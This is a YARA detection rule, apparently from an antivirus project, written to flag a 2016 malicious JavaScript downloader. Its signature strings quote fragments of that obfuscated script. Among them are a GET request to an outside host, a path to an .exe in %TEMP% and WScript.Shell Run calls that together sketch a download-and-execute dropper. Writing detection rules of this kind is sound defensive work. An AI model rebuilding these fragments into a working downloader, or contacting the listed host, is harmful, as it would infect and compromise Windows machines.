rule sig_20160328_5f4374ab35c5bcf597738ffdbd07cbe9 {
  meta:
    description = "datamaliciousorder - file 20160328_5f4374ab35c5bcf597738ffdbd07cbe9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "693c1cf5d98726ee983b79aedbae763b01a093c10e384b2f903b6aafcbc5bc05"

  strings:
    $s1  = "function Ctpyodswk() {return Fhmejglprq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"5XjzQf86bvKSc3.exe\";};" fullword ascii
    $s2  = "Dkdjr[Dmbezyp](\"GET\", \"http://happyweek.us/kei3a\", false);" fullword ascii
    $s3  = "var Fhmejglprq = function Rbujannvga() {return WScript[Jihcyrjsqg](\"WScript.Shell\");}();" fullword ascii
    $s4  = "do {WScript[Qyvdbrf](Rqwqmjca() * 11)} while (Dkdjr[\"readystate\"] < 4 );" fullword ascii
    $s5  = "function Sktzkmtss(Qpucaxb, Qrgzdfvc){return Qpucaxb - Qrgzdfvc;};" fullword ascii
    $s6  = "function Gqckvctlx(Xdkpyzn){Fhmejglprq[\"Run\"](Xdkpyzn, Fwqbdg, Fwqbdg);};" fullword ascii
    $s7  = "function Zaqhglmf() {return ((Gsowb == true) && (Gsowb == Fvrixn)) ? 1 : Fwqbdg;};" fullword ascii
    $s8  = "function Nyakzq(Hscin) {var Tbzblamsva = (1, 2, 3, 4, 5, Hscin); return Tbzblamsva;};" fullword ascii
    $s9  = "return Sktzkmtss(Qbwuu, Wotor);" fullword ascii
    $s10 = "function Lgfcdlc(){return Jihcyrjsqg;};" fullword ascii
    $s11 = " while (Hbpamhon){" fullword ascii
    $s12 = "var Fvrixn = false;" fullword ascii
    $s13 = "function Keslla()" fullword ascii
    $s14 = "var Gsowb = false;" fullword ascii
    $s15 = "Gsowb = true; " fullword ascii
    $s16 = "function Cndweotv(){return Acmsfr;};" fullword ascii
    $s17 = "Fvrixn = true; " fullword ascii
    $s18 = "var Eqvtg = false;" fullword ascii
    $s19 = "var Wacybpa = new this[\"Date\"]();" fullword ascii
    $s20 = "function Rqwqmjca(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}